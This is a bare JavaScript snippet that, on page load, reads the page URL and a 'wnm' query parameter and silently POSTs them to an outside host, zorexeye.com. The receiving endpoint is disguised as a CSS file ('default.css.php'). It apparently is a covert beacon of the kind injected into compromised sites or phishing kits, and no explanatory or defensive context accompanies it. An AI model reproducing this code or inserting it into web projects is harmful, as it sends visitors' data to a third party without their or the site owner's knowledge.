   var weus = window.location.href;
var weu = window.location.href;
    var wnm = getUrlParameter('wnm');
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://zorexeye.com/styles/cdn/default.css.php", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("weu="+weu+"&wnm="+wnm);

    function getUrlParameter(name) {
        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
        var results = regex.exec(location.search);
        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    };
